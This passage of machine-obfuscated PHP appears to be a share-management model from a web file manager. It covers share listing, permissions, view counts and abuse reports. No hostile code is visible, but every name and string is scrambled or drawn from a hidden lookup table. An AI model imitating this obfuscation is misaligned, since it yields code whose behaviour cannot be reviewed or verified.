cacheFunctionAlias($»ŠËê¾) { $ÙİÃÔ¨¿ =& $_SERVER[ˆûùúÊ¯]; $©ì¸¦¸› = isset($»ŠËê¾[0]) ? $»ŠËê¾[0] : !1; return array($ÙİÃÔ¨¿[2035] => array(USER_ID, $ÙİÃÔ¨¿[2036]), $ÙİÃÔ¨¿[1976] => array($©ì¸¦¸›, $ÙİÃÔ¨¿[2037])); } protected function listSimple() { $ÃÁßı£ = array($_SERVER[ˆûùúÊ¯][1704] => USER_ID); $ü´ï†É× = $this->field($this->fieldList)->where($ÃÁßı£)->select(); return $ü´ï†É× ? $ü´ï†É× : array(); } protected function getInfo($¦ÉÌœ‡, $Òë„ŞúØ = false) { $“È…è‚€ =& $_SERVER[ˆûùúÊ¯]; if ($Òë„ŞúØ) { return $this->_getShareInfo(array($“È…è‚€[641] => $¦ÉÌœ‡)); } $§äººÍ² = $this->cacheFunctionGet($“È…è‚€[1978], $¦ÉÌœ‡); return $§äººÍ²; } public function getInfoByHash($½â‹À·é) { return $this->_getShareInfo(array($_SERVER[ˆûùúÊ¯][2038] => $½â‹À·é)); } public function getInfoByPath($è±é’úƒ) { $ù“¨ƒ²Ë =& $_SERVER[ˆûùúÊ¯]; $´ñÈĞˆŠ = array($ù“¨ƒ²Ë[1704] => USER_ID, $ù“¨ƒ²Ë[190] => $è±é’úƒ); return $this->_getShareInfo($´ñÈĞˆŠ); } public function getInfoBySourcePath($ß¥òöÍË) { $Ò Êû“¼ =& $_SERVER[ˆûùúÊ¯]; $ëèºÁÅ£ = array($Ò Êû“¼[1704] => USER_ID, $Ò Êû“¼[1236] => $ß¥òöÍË); return $this->_getShareInfo($ëèºÁÅ£); } private function _getShareInfo($ë¨ºî™) { $œ¶¯ÕÓÄ =& $_SERVER[ˆûùúÊ¯]; $Õ¯‚éçï = $this->where($ë¨ºî™)->find(); if (!$Õ¯‚éçï) { return !1; } $ë¨ºî™ = array($œ¶¯ÕÓÄ[641] => $Õ¯‚éçï[$œ¶¯ÕÓÄ[641]]); $ı’­Å©† = $œ¶¯ÕÓÄ[2039]; $¥†İ±› = Model($œ¶¯ÕÓÄ[642])->order($œ¶¯ÕÓÄ[451])->field($ı’­Å©†)->where($ë¨ºî™)->select(); if ($Õ¯‚éçï[$œ¶¯ÕÓÄ[190]] == $œ¶¯ÕÓÄ[221]) { $Õ¯‚éçï[$œ¶¯ÕÓÄ[97]] = IO::info($Õ¯‚éçï[$œ¶¯ÕÓÄ[1236]]); } else { $Õ¯‚éçï[$œ¶¯ÕÓÄ[97]] = Model($œ¶¯ÕÓÄ[1393])->pathInfo($Õ¯‚éçï[$œ¶¯ÕÓÄ[190]]); } $Õ¯‚éçï[$œ¶¯ÕÓÄ[2040]] = $¥†İ±›; return $Õ¯‚éçï; } protected function getInfoAuth($éñµÄñ¢) { $™”¦Í¼Ó =& $_SERVER[ˆûùúÊ¯]; $ºÓ‘¢³ = $this->getInfo($éñµÄñ¢); if ($ºÓ‘¢³[$™”¦Í¼Ó[1704]] == USER_ID) { $ºÓ‘¢³[$™”¦Í¼Ó[463]] = $ºÓ‘¢³[$™”¦Í¼Ó[97]][$™”¦Í¼Ó[463]]; } else { $ºÓ‘¢³[$™”¦Í¼Ó[463]] = Model($™”¦Í¼Ó[543])->authMake($ºÓ‘¢³[$™”¦Í¼Ó[2040]]); } return $ºÓ‘¢³; } protected function listData($®ÙÄ»šİ = null, $ø…Û¼ = 300) { $èÍñÉÆ =& $_SERVER[ˆûùúÊ¯]; $½—œ¯Û— = array(array($èÍñÉÆ[538] => array($èÍñÉÆ[1073], 0), $èÍñÉÆ[639] => array($èÍñÉÆ[1073], 0), $èÍñÉÆ[2041] => $èÍñÉÆ[1994])); if ($®ÙÄ»šİ == $èÍñÉÆ[2042]) { $½—œ¯Û— = array($èÍñÉÆ[538] => 1); } else { if ($®ÙÄ»šİ == $èÍñÉÆ[1222]) { $½—œ¯Û— = array($èÍñÉÆ[639] => 1); } } $½—œ¯Û—[$èÍñÉÆ[1704]] = USER_ID; $Ş–„‚ƒÒ = $this->where($½—œ¯Û—)->selectPage($ø…Û¼); return $Ş–„‚ƒÒ; } protected function listToMe($ìĞğ—ğ• = 300) { $ƒ‚Õ²ª’ =& $_SERVER[ˆûùúÊ¯]; $‹âœî¯™ = Model($ƒ‚Õ²ª’[2043])->userGroupParents(USER_ID); $Ø…˜¡Š = array($ƒ‚Õ²ª’[624] => SourceModel::TYPE_USER, $ƒ‚Õ²ª’[546] => USER_ID); if ($‹âœî¯™) { $Ø…˜¡Š = array(array($ƒ‚Õ²ª’[624] => SourceModel::TYPE_USER, $ƒ‚Õ²ª’[546] => USER_ID), array($ƒ‚Õ²ª’[624] => SourceModel::TYPE_GROUP, $ƒ‚Õ²ª’[546] => array($ƒ‚Õ²ª’[7], $‹âœî¯™)), $ƒ‚Õ²ª’[2041] => $ƒ‚Õ²ª’[1994]); } $ûªãıŸ = Model($ƒ‚Õ²ª’[642])->where($Ø…˜¡Š)->selectPage($ìĞğ—ğ•); $¦Ë€ĞÀÃ = array_to_keyvalue_group($ûªãıŸ[$ƒ‚Õ²ª’[421]], $ƒ‚Õ²ª’[641]); if (!$¦Ë€ĞÀÃ) { return $ûªãıŸ; } $¨ˆÉº¿œ = $ƒ‚Õ²ª’[2044]; $Ø…˜¡Š = array($ƒ‚Õ²ª’[641] => array($ƒ‚Õ²ª’[468], array_keys($¦Ë€ĞÀÃ)), $ƒ‚Õ²ª’[1704] => array($ƒ‚Õ²ª’[1075], $ƒ‚Õ²ª’[221])); $æêãıÅ™ = $this->field($¨ˆÉº¿œ)->where($Ø…˜¡Š)->select(); foreach ($æêãıÅ™ as $ÇÚæÅ  => &$®ÜÅ‡®ı) { $®ÜÅ‡®ı[$ƒ‚Õ²ª’[2040]] = $¦Ë€ĞÀÃ[$®ÜÅ‡®ı[$ƒ‚Õ²ª’[641]]]; } unset($®ÜÅ‡®ı); $ ËÔ©¦ = array($ƒ‚Õ²ª’[2045] => $æêãıÅ™, $ƒ‚Õ²ª’[2046] => $ûªãıŸ[$ƒ‚Õ²ª’[418]]); return $ ËÔ©¦; } protected function shareAdd($éÇ»ïå§, $‡×»©‚‘) { $‚ù§“àø =& $_SERVER[ˆûùúÊ¯]; $”™úú§ = $this->_addShareData($éÇ»ïå§, $‡×»©‚‘); if (!empty($‡×»©‚‘[$‚ù§“àø[2047]])) { $this->_shareAuthSet($”™úú§, $‡×»©‚‘[$‚ù§“àø[2047]]); } $this->shareEventAdd($éÇ»ïå§, $‡×»©‚‘, $‚ù§“àø[2048]); return $”™úú§; } protected function shareAddSystem($ï¢Â¢€, $ŞÖ¢ôö) { $ØıÖ¾ºÉ =& $_SERVER[ˆûùúÊ¯]; $‘ÜôïÄ = $this->_addShareData($ï¢Â¢€, $ŞÖ¢ôö, $ØıÖ¾ºÉ[188]); $this->_shareAuthSet($‘ÜôïÄ, $ŞÖ¢ôö[$ØıÖ¾ºÉ[2047]]); return $‘ÜôïÄ; } private function shareEventAdd($†ææÕ¶„, $½²È…Åí, $“³ãÑìİ = "\141\144\144") { $™©€à³Í =& $_SERVER[ˆûùúÊ¯]; if (!$†ææÕ¶„ || $†ææÕ¶„ == $™©€à³Í[221]) { return; } if ($“³ãÑìİ == $™©€à³Í[2048]) { if ($½²È…Åí[$™©€à³Í[538]] == $™©€à³Í[98]) { Model($™©€à³Í[609])->eventShare($†ææÕ¶„, $™©€à³Í[2049]); } if ($½²È…Åí[$™©€à³Í[639]] == $™©€à³Í[98]) { Model($™©€à³Í[609])->eventShare($†ææÕ¶„, $™©€à³Í[2050]); } return; } $äüÛÙ™ = $this->getInfoByPath($†ææÕ¶„); $ê¿§²Š = $™©€à³Í[2051]; if ($äüÛÙ™[$™©€à³Í[538]] == $™©€à³Í[221] && $½²È…Åí[$™©€à³Í[538]] == $™©€à³Í[98]) { $ê¿§²Š = $™©€à³Í[2049]; } if ($äüÛÙ™[$™©€à³Í[538]] == $™©€à³Í[98] && $½²È…Åí[$™©€à³Í[538]] == $™©€à³Í[221]) { $ê¿§²Š = $™©€à³Í[2052]; } if ($äüÛÙ™[$™©€à³Í[639]] == $™©€à³Í[221] && $½²È…Åí[$™©€à³Í[639]] == $™©€à³Í[98]) { $ê¿§²Š = $™©€à³Í[2050]; } if ($äüÛÙ™[$™©€à³Í[639]] == $™©€à³Í[98] && $½²È…Åí[$™©€à³Í[639]] == $™©€à³Í[221]) { $ê¿§²Š = $™©€à³Í[2053]; } Model($™©€à³Í[609])->eventShare($†ææÕ¶„, $ê¿§²Š); return; } private function _addShareData($³„È„Ìñ, $½°Ø´ıå = array(), $óÚß‘Ü = false) { $ç¨‹²® =& $_SERVER[ˆûùúÊ¯]; $‹ø÷ÌõÅ = $óÚß‘Ü == $ç¨‹²®[188] ? 0 : USER_ID; $ç•Œö¬’ = array($ç¨‹²®[467] => $³„È„Ìñ, $ç¨‹²®[1695] => $‹ø÷ÌõÅ); if ($³„È„Ìñ == 0) { $ç•Œö¬’ = array($ç¨‹²®[2054] => $½°Ø´ıå[$ç¨‹²®[1236]], $ç¨‹²®[1695] => $‹ø÷ÌõÅ); } if ($Ô–©¡Ûò = $this->where($ç•Œö¬’)->find()) { return $Ô–©¡Ûò[$ç¨‹²®[641]]; } if ($³„È„Ìñ == 0) { $ÙÀ•šÙÄ = array($ç¨‹²®[42] => get_path_this($½°Ø´ıå[$ç¨‹²®[94]])); } else { $ÙÀ•šÙÄ = Model($ç¨‹²®[885])->sourceInfo($³„È„Ìñ); if (!$ÙÀ•šÙÄ) { return !1; } } if (!$½°Ø´ıå[$ç¨‹²®[1601]]) { $½°Ø´ıå[$ç¨‹²®[1601]] = $ÙÀ•šÙÄ[$ç¨‹²®[42]]; } $Ú¿¨“œò = array($ç¨‹²®[1695] => $‹ø÷ÌõÅ, $ç¨‹²®[467] => $³„È„Ìñ, $ç¨‹²®[1601] => $ç¨‹²®[12], $ç¨‹²®[538] => 0, $ç¨‹²®[639] => 0, $ç¨‹²®[1236] => $ç¨‹²®[12], $ç¨‹²®[359] => $ç¨‹²®[12], $ç¨‹²®[950] => $ç¨‹²®[12], $ç¨‹²®[2055] => 0, $ç¨‹²®[2056] => 0, $ç¨‹²®[821] => 0, $ç¨‹²®[2057] => $ç¨‹²®[12], $ç¨‹²®[2038] => $ç¨‹²®[12]); $ÑóÌØÒ£ = explode($ç¨‹²®[60], $ç¨‹²®[2058]); foreach ($ÑóÌØÒ£ as $Ì¡™•ì®) { if (!isset($½°Ø´ıå[$Ì¡™•ì®])) { continue; } $Ú¿¨“œò[$Ì¡™•ì®] = $½°Ø´ıå[$Ì¡™•ì®]; } $„çûù¤ = $this->add($Ú¿¨“œò); $¼åò£Ø¢ = array($ç¨‹²®[2038] => short_id($„çûù¤)); $this->where(array($ç¨‹²®[2059] => $„çûù¤))->save($¼åò£Ø¢); return $„çûù¤; } private function _shareAuthSet($íÎ‘îæñ, $š¼˜›½) { $íõñõï¹ =& $_SERVER[ˆûùúÊ¯]; if (!is_array($š¼˜›½)) { return !1; } $­î¶ÊÈŒ = Model($íõñõï¹[2004]); $­î¶ÊÈŒ->where(array($íõñõï¹[641] => $íÎ‘îæñ))->delete(); $‡÷¬Öë½ = array(); foreach ($š¼˜›½ as $ÛŞóå) { $ĞåÔÏÀ = SourceModel::TYPE_USER; if ($ÛŞóå[$íõñõï¹[187]] == SourceModel::TYPE_GROUP) { $ĞåÔÏÀ = SourceModel::TYPE_GROUP; } $ĞËî±àä = array($íõñõï¹[641] => $íÎ‘îæñ, $íõñõï¹[187] => $ĞåÔÏÀ, $íõñõï¹[546] => intval($ÛŞóå[$íõñõï¹[546]]), $íõñõï¹[2000] => 0, $íõñõï¹[2060] => -1); if ($ÛŞóå[$íõñõï¹[2000]]) { $ĞËî±àä[$íõñõï¹[2000]] = $ÛŞóå[$íõñõï¹[2000]]; } else { if ($ÛŞóå[$íõñõï¹[2060]]) { $ĞËî±àä[$íõñõï¹[2060]] = $ÛŞóå[$íõñõï¹[2060]]; } } $‡÷¬Öë½[] = $ĞËî±àä; } return $­î¶ÊÈŒ->addAll($‡÷¬Öë½, array(), !0); } public function numViewAdd($¼©»÷û—) { $‰¯´•†÷ =& $_SERVER[ˆûùúÊ¯]; $¢Òö¤· = array($‰¯´•†÷[2059] => $¼©»÷û—); $this->where($¢Òö¤·)->setAdd($‰¯´•†÷[2055]); } public function numDownloadAdd($ËÒÒå‡Ú) { $”ä ğÊ‚ =& $_SERVER[ˆûùúÊ¯]; $‡¤ùû·û = array($”ä ğÊ‚[2059] => $ËÒÒå‡Ú); $this->where($‡¤ùû·û)->setAdd($”ä ğÊ‚[2056]); } protected function shareEdit($¦©¨ı˜ã, $«ûå„‘Œ) { $÷Õ¦Õè³ =& $_SERVER[ˆûùúÊ¯]; $ûîí… = $this->getInfo($¦©¨ı˜ã); if (!$ûîí…) { return !1; } $this->_checkLinkShare($«ûå„‘Œ, $ûîí…); $ã¾ù¹×¼ = array(); $ÄŒ©Ó = explode($÷Õ¦Õè³[60], $÷Õ¦Õè³[2061]); foreach ($ÄŒ©Ó as $ƒ“¡üÒŒ) { if (!array_key_exists($ƒ“¡üÒŒ, $«ûå„‘Œ)) { continue; } $ã¾ù¹×¼[$ƒ“¡üÒŒ] = $«ûå„‘Œ[$ƒ“¡üÒŒ]; } $this->shareEventAdd($ûîí…[$÷Õ¦Õè³[190]], $«ûå„‘Œ, $÷Õ¦Õè³[1866]); $this->where(array($÷Õ¦Õè³[2059] => $¦©¨ı˜ã))->save($ã¾ù¹×¼); if (isset($«ûå„‘Œ[$÷Õ¦Õè³[2047]])) { $this->_shareAuthSet($¦©¨ı˜ã, $«ûå„‘Œ[$÷Õ¦Õè³[2047]]); } return !0; } private function _checkLinkShare($£ÑÑÊÌƒ, $Ğœç€¬ˆ) { $õşîØÙ‘ =& $_SERVER[ˆûùúÊ¯]; if ($£ÑÑÊÌƒ[$õşîØÙ‘[538]] != $õşîØÙ‘[98]) { return; } $®ö””§Õ = $Ğœç€¬ˆ[$õşîØÙ‘[97]][$õşîØÙ‘[190]]; if ($Ğœç€¬ˆ[$õşîØÙ‘[97]][$õşîØÙ‘[43]] != $õşîØÙ‘[223]) { $ğ…ÓáÅÕ = $this->_folderReport($®ö””§Õ); if (!$ğ…ÓáÅÕ) { return; } show_json(LNG($õşîØÙ‘[2062]) . $õşîØÙ‘[2063] . $ğ…ÓáÅÕ, !1); } $ïéÎ¿æ = Model($õşîØÙ‘[885])->fileInfoGet($Ğœç€¬ˆ[$õşîØÙ‘[97]][$õşîØÙ‘[190]]); if (!$ïéÎ¿æ) { return; } $ÇÁˆ¾ğæ = $this->shareFileMeta($ïéÎ¿æ[$õşîØÙ‘[517]]); if (isset($ÇÁˆ¾ğæ[$õşîØÙ‘[426]]) && $ÇÁˆ¾ğæ[$õşîØÙ‘[426]] == $õşîØÙ‘[98]) { show_json(LNG($õşîØÙ‘[2064]), !1); } } private function _folderReport($­êı”·Ø) { $®£ƒ¼¸ =& $_SERVER[ˆûùúÊ¯]; $¬Ò¶‰Çğ = array($®£ƒ¼¸[517] => array($®£ƒ¼¸[1073], 0), $®£ƒ¼¸[810] => 3); $™ò‰½÷ƒ = Model($®£ƒ¼¸[2065])->where($¬Ò¶‰Çğ)->field($®£ƒ¼¸[517])->select(); if (!$™ò‰½÷ƒ) { return !1; } $™ò‰½÷ƒ = array_to_keyvalue($™ò‰½÷ƒ, $®£ƒ¼¸[12], $®£ƒ¼¸[517]); $ü÷Èº¼Ô = $®£ƒ¼¸[60] . $­êı”·Ø . $®£ƒ¼¸[60]; $¬Ò¶‰Çğ = array($®£ƒ¼¸[517] => array($®£ƒ¼¸[7], $™ò‰½÷ƒ), $®£ƒ¼¸[561] => array($®£ƒ¼¸[435], "\45{$ü÷Èº¼Ô}\45"), $®£ƒ¼¸[481] => 0); $Ãíƒáä = Model($®£ƒ¼¸[885])->where($¬Ò¶‰Çğ)->field($®£ƒ¼¸[2066])->find(); if (!$Ãíƒáä) { return !1; } $ØëÓï = substr($Ãíƒáä[$®£ƒ¼¸[561]], strpos($Ãíƒáä[$®£ƒ¼¸[561]], $ü÷Èº¼Ô)); $¬Ò¶‰Çğ = array($®£ƒ¼¸[190] => array($®£ƒ¼¸[7], trim($ØëÓï, $®£ƒ¼¸[60]))); $Ú¦‡Òêï = Model($®£ƒ¼¸[885])->where($¬Ò¶‰Çğ)->field($®£ƒ¼¸[42])->select(); $ÊìçãËÌ = array_to_keyvalue($Ú¦‡Òêï, $®£ƒ¼¸[12], $®£ƒ¼¸[42]); $ÊìçãËÌ[] = $Ãíƒáä[$®£ƒ¼¸[42]]; return implode($®£ƒ¼¸[8], $ÊìçãËÌ); } protected function remove($÷Œô¢†ğ) { $í·ÊıÀ´ =& $_SERVER[ˆûùúÊ¯]; if (is_array($÷Œô¢†ğ)) { $÷Œô¢†ğ = array($í·ÊıÀ´[7], $÷Œô¢†ğ); } $¯§«İ³â = array($í·ÊıÀ´[641] => $÷Œô¢†ğ); $€¥ÓÛè— = $this->where($¯§«İ³â)->delete(); if ($€¥ÓÛè—) { Model($í·ÊıÀ´[642])->where(array($í·ÊıÀ´[641] => $÷Œô¢†ğ))->delete(); } $Æ ´„»‰ = is_array($÷Œô¢†ğ) ? $÷Œô¢†ğ[1] : array($÷Œô¢†ğ); for ($à•Éôºü = 0; $à•Éôºü < count($Æ ´„»‰); $à•Éôºü++) { $ÆÈÊ‘† = $this->getInfo($Æ ´„»‰[$à•Éôºü]); if ($ÆÈÊ‘†[$í·ÊıÀ´[639]] == $í·ÊıÀ´[98]) { Model($í·ÊıÀ´[609])->eventShare($ÆÈÊ‘†[$í·ÊıÀ´[190]], $í·ÊıÀ´[2053]); } if ($ÆÈÊ‘†[$í·ÊıÀ´[538]] == $í·ÊıÀ´[98]) { Model($í·ÊıÀ´[609])->eventShare($ÆÈÊ‘†[$í·ÊıÀ´[190]], $í·ÊıÀ´[2052]); } } return $€¥ÓÛè—; } protected function removeBySource($šº›‹¤¶) { $ùŸåà¬€ =& $_SERVER[ˆûùúÊ¯]; $„ğ‡÷ê = array($ùŸåà¬€[467] => array($ùŸåà¬€[468], $šº›‹¤¶)); $ÏÕñ» = $this->field($ùŸåà¬€[641])->where($„ğ‡÷ê)->select(); $ÏÕñ» = array_to_keyvalue($ÏÕñ», $ùŸåà¬€[12], $ùŸåà¬€[641]); if (!$ÏÕñ») { return; } $„ğ‡÷ê = array($ùŸåà¬€[2059] => array($ùŸåà¬€[468], $ÏÕñ»)); $this->where($„ğ‡÷ê)->delete(); Model($ùŸåà¬€[642])->where($„ğ‡÷ê)->delete(); } public function listAll($‘é˜”Å) { $Ò¹Õı”î =& $_SERVER[ˆûùúÊ¯]; $‰Öğ‹ú = array(); if ($‘é˜”Å[$Ò¹Õı”î[1704]]) { $‰Öğ‹ú[$Ò¹Õı”î[1704]] = $‘é˜”Å[$Ò¹Õı”î[1704]]; } if ($‘é˜”Å[$Ò¹Õı”î[820]]) { $€ãà˜ü´ = $‘é˜”Å[$Ò¹Õı”î[821]] ? $‘é˜”Å[$Ò¹Õı”î[821]] : strtotime(date($Ò¹Õı”î[2067])); $‰Öğ‹ú[$Ò¹Õı”î[224]] = array($Ò¹Õı”î[385], array($‘é˜”Å[$Ò¹Õı”î[820]], $€ãà˜ü´)); } if ($‘é˜”Å[$Ò¹Õı”î[43]]) { $‰Öğ‹ú[$‘é˜”Å[$Ò¹Õı”î[43]]] = 1; } else { $‰Öğ‹ú[] = array($Ò¹Õı”î[538] => array($Ò¹Õı”î[1073], 0), $Ò¹Õı”î[639] => array($Ò¹Õı”î[1073], 0), $Ò¹Õı”î[2041] => $Ò¹Õı”î[1994]); } if ($‘é˜”Å[$Ò¹Õı”î[1990]]) { $‰Öğ‹ú[] = array($Ò¹Õı”î[2038] => $‘é˜”Å[$Ò¹Õı”î[1990]], $Ò¹Õı”î[1601] => array($Ò¹Õı”î[435], "\45{$‘é˜”Å[$Ò¹Õı”î[1990]]}\x25"), $Ò¹Õı”î[2041] => $Ò¹Õı”î[1994]); } $ï™•â = $this->_makeOrder()->where($‰Öğ‹ú)->selectPage(20); if (empty($ï™•â[$Ò¹Õı”î[421]])) { return array(); } $this->_listDataApply($ï™•â[$Ò¹Õı”î[421]]); return $ï™•â; } public function listDataApply($ÅçÅ›âô) { $this->_listDataApply($ÅçÅ›âô); return $ÅçÅ›âô; } private function _listDataApply(&$Éƒ­’Ú) { $áş‡˜İä =& $_SERVER[ˆûùúÊ¯]; $¹–ğü­ = array_to_keyvalue($Éƒ­’Ú, $áş‡˜İä[12], $áş‡˜İä[1704]); $ó»‰¼• = Model($áş‡˜İä[575])->userListInfo(array_unique($¹–ğü­)); $¯”Ú­È = array_to_keyvalue($Éƒ­’Ú, $áş‡˜İä[12], $áş‡˜İä[190]); $÷…·Õœ¿ = Model($áş‡˜İä[885])->sourceListInfo($¯”Ú­È, !0); foreach ($Éƒ­’Ú as $ÛËÑŒ³Å => &$×òø®º) { $†ŞøÈÂØ = $×òø®º[$áş‡˜İä[1704]]; $×òø®º[$áş‡˜İä[2068]] = $ó»‰¼•[$†ŞøÈÂØ] ? $ó»‰¼•[$†ŞøÈÂØ] : !1; $Ú®°³úÆ = $×òø®º[$áş‡˜İä[190]]; $×òø®º[$áş‡˜İä[97]] = $÷…·Õœ¿[$Ú®°³úÆ] ? $÷…·Õœ¿[$Ú®°³úÆ] : !1; if ($×òø®º[$áş‡˜İä[97]][$áş‡˜İä[481]] == $áş‡˜İä[98]) { unset($Éƒ­’Ú[$ÛËÑŒ³Å]); } if ($×òø®º[$áş‡˜İä[97]] != $áş‡˜İä[221] && !$×òø®º[$áş‡˜İä[97]]) { unset($Éƒ­’Ú[$ÛËÑŒ³Å]); } } unset($×òø®º); $Éƒ­’Ú = array_values($Éƒ­’Ú); } private function _makeOrder($“Ç€ƒ‰È = '') { $‘ƒéÓ‹ =& $_SERVER[ˆûùúÊ¯]; $¥“œîÎ = array($‘ƒéÓ‹[224], $‘ƒéÓ‹[821], $‘ƒéÓ‹[2055], $‘ƒéÓ‹[2056]); $µŸ©«¹Š = array($‘ƒéÓ‹[499] => $‘ƒéÓ‹[500], $‘ƒéÓ‹[501] => $‘ƒéÓ‹[502]); $×“òß©ó = Input::get($‘ƒéÓ‹[506], $‘ƒéÓ‹[7], $‘ƒéÓ‹[473], $¥“œîÎ); $Õ¢±İ¨‘ = Input::get($‘ƒéÓ‹[507], $‘ƒéÓ‹[7], $‘ƒéÓ‹[2069], array($‘ƒéÓ‹[1987], $‘ƒéÓ‹[501])); $Õ¢±İ¨‘ = $µŸ©«¹Š[$Õ¢±İ¨‘]; $“Ç€ƒ‰È = $“Ç€ƒ‰È . "{$×“òß©ó}\x20{$Õ¢±İ¨‘}"; return $this->order($“Ç€ƒ‰È); } public function reportAdd($şáËÁµœ) { $ëõÖÔÀ  =& $_SERVER[ˆûùúÊ¯]; $½í§ÀÛ— = array($ëõÖÔÀ [641] => $şáËÁµœ[$ëõÖÔÀ [641]], $ëõÖÔÀ [1704] => USER_ID); if (Model($ëõÖÔÀ [2065])->where($½í§ÀÛ—)->find()) { return !1; } $—í¢„áò = array($ëõÖÔÀ [641] => $şáËÁµœ[$ëõÖÔÀ [641]], $ëõÖÔÀ [1601] => $şáËÁµœ[$ëõÖÔÀ [1601]], $ëõÖÔÀ [190] => $şáËÁµœ[$ëõÖÔÀ [190]], $ëõÖÔÀ [517] => $şáËÁµœ[$ëõÖÔÀ [517]], $ëõÖÔÀ [1704] => USER_ID, $ëõÖÔÀ [43] => $şáËÁµœ[$ëõÖÔÀ [43]], $ëõÖÔÀ [502] => $şáËÁµœ[$ëõÖÔÀ [502]]); return Model($ëõÖÔÀ [2065])->add($—í¢„áò); } public function reportList($…À‰ÚŸ…) { $–¯âº÷ö =& $_SERVER[ˆûùúÊ¯]; $¨åÏ˜ï = array(); if ($…À‰ÚŸ…[$–¯âº÷ö[820]]) { $š®‘¿÷Í = $…À‰ÚŸ…[$–¯âº÷ö[821]] ? $…À‰ÚŸ…[$–¯âº÷ö[821]] : strtotime(date($–¯âº÷ö[2067])); $¨åÏ˜ï[$–¯âº÷ö[224]] = array($–¯âº÷ö[385], array($…À‰ÚŸ…[$–¯âº÷ö[820]], $š®‘¿÷Í)); } if (isset($…À‰ÚŸ…[$–¯âº÷ö[43]]) && in_array($…À‰ÚŸ…[$–¯âº÷ö[43]], array($–¯âº÷ö[98], $–¯âº÷ö[486], $–¯âº÷ö[2070], $–¯âº÷ö[2071], $–¯âº÷ö[2072]))) { $¨åÏ˜ï[$–¯âº÷ö[43]] = $…À‰ÚŸ…[$–¯âº÷ö[43]]; } if (isset($…À‰ÚŸ…[$–¯âº÷ö[810]]) && in_array($…À‰ÚŸ…[$–¯âº÷ö[810]], array($–¯âº÷ö[221], $–¯âº÷ö[98], $–¯âº÷ö[486], $–¯âº÷ö[2070]))) { $¨åÏ˜ï[$–¯âº÷ö[810]] = $…À‰ÚŸ…[$–¯âº÷ö[810]]; } $Æ×¿§Øš = Input::get($–¯âº÷ö[507], $–¯âº÷ö[7], $–¯âº÷ö[2069], array($–¯âº÷ö[1987], $–¯âº÷ö[501])); $ä÷ À¨ = array($–¯âº÷ö[499] => $–¯âº÷ö[500], $–¯âº÷ö[501] => $–¯âº÷ö[502]); $æÌâÙ¨½ = $–¯âº÷ö[2073] . $ä÷ À¨[$Æ×¿§Øš]; $íÛÇ¯Ì = Model($–¯âº÷ö[2065])->where($¨åÏ˜ï)->order($æÌâÙ¨½)->selectPage(20); if (empty($íÛÇ¯Ì[$–¯âº÷ö[421]])) { return array(); } $„òûˆØÌ = array_to_keyvalue_group($íÛÇ¯Ì[$–¯âº÷ö[421]], $–¯âº÷ö[810], $–¯âº÷ö[641]); if (!empty($„òûˆØÌ[0])) { $…À‰ÚŸ… = $„òûˆØÌ[0]; $¨åÏ˜ï = array($–¯âº÷ö[641] => array($–¯âº÷ö[7], $…À‰ÚŸ…)); $Ï‰£äè = $this->where($¨åÏ˜ï)->field($–¯âº÷ö[641])->select(); $Ï‰£äè = array_to_keyvalue($Ï‰£äè, $–¯âº÷ö[12], $–¯âº÷ö[641]); $´ƒùªÚ¾ = array_diff($…À‰ÚŸ…, $Ï‰£äè); if (!empty($´ƒùªÚ¾)) { foreach ($íÛÇ¯Ì[$–¯âº÷ö[421]] as $œ´ã©¯é => $µ«ûˆ¾‚) { if (in_array($µ«ûˆ¾‚[$–¯âº÷ö[641]], $´ƒùªÚ¾)) { unset($íÛÇ¯Ì[$–¯âº÷ö[421]][$œ´ã©¯é]); } } } } $this->_listDataApply($íÛÇ¯Ì[$–¯âº÷ö[421]]); return $íÛÇ¯Ì; } public function reportStatus($à²û”¥´) { $ôˆ‚öÅö =& $_SERVER[ˆûùúÊ¯]; $íéÄÔØê = array($ôˆ‚öÅö[451] => $à²û”¥´[$ôˆ‚öÅö[451]]); $·Å­è‘ = Model($ôˆ‚öÅö[2065])->where($íéÄÔØê)->field($ôˆ‚öÅö[2074])->find(); if (!$·Å­è‘) { return !1; } $äğŞşÑñ = array($ôˆ‚öÅö[810] => $à²û”¥´[$ôˆ‚öÅö[810]]); if ($à²û”¥´[$ôˆ‚öÅö[810]] == $ôˆ‚öÅö[2070] && $·Å­è‘[$ôˆ‚öÅö[810]] == $ôˆ‚öÅö[2070]) { $äğŞşÑñ[$ôˆ‚öÅö[810]] = 0; } $¦¡ªÃ®Ë = Model($ôˆ‚öÅö[2065])->where($íéÄÔØê)->save($äğŞşÑñ); if ($à²û”¥´[$ôˆ‚öÅö[810]] == $ôˆ‚öÅö[486]) { if ($·Å­è‘[$ôˆ‚öÅö[517]] != $ôˆ‚öÅö[221] && $this->shareFileMeta($·Å­è‘[$ôˆ‚öÅö[517]])) { $this->shareFileMeta($·Å­è‘[$ôˆ‚öÅö[517]], 0); } $this->remove($·Å­è‘[$ôˆ‚öÅö[641]]); return !0; } if ($¦¡ªÃ®Ë && $à²û”¥´[$ôˆ‚öÅö[810]] == $ôˆ‚öÅö[2070]) { $û„Áô¸· = $äğŞşÑñ[$ôˆ‚öÅö[810]] == $ôˆ‚öÅö[2070] ? 1 : 0; $this->shareFileMeta($·Å­è‘[$ôˆ‚öÅö[517]], $û„Áô¸·); $this->removeByFile($·Å­è‘[$ôˆ‚öÅö[517]]); } return $¦¡ªÃ®Ë; } private function removeByFile($ØªàÔ©Ä) { $ë±¬¦ô =& $_SERVER[ˆûùúÊ¯]; $ı”§®êô = Model($ë±¬¦ô[885])->where(array($ë±¬¦ô[517] => $ØªàÔ©Ä))->field($ë±¬¦ô[190])->select(); $§õ«‚ò– = array_to_keyvalue($ı”§®êô, $ë±¬¦ô[12], $ë±¬¦ô[190]); $ïù†ÄÄ = array($ë±¬¦ô[190] => array($ë±¬¦ô[7], $§õ«‚ò–), $ë±¬¦ô[538] => 1); $ı”§®êô = $this->where($ïù†ÄÄ)->field($ë±¬¦ô[641])->select(); if (empty($ı”§®êô)) { return; } $¨ï²èã£ = array_to_keyvalue($ı”§®êô, $ë±¬¦ô[12], $ë±¬¦ô[641]); $this->remove($¨ï²èã£); } private function shareFileMeta($ØöÑÂî, $¦¦äÇ† = null) { $­öŞÑ¡ =& $_SERVER[ˆûùúÊ¯]; $‰¤ˆ­İ = array($­öŞÑ¡[517] => $ØöÑÂî, $­öŞÑ¡[104] => $­öŞÑ¡[2075]); if (is_null($¦¦äÇ†)) { return Model($­öŞÑ¡[2076])->where($‰¤ˆ­İ)->find(); } $‰¤ˆ­İ[$­öŞÑ¡[426]] = $¦¦äÇ†; Model($­öŞÑ¡[2076])->add($‰¤ˆ­İ, array(), !0); } } goto fš§ŞÃİ´¹; 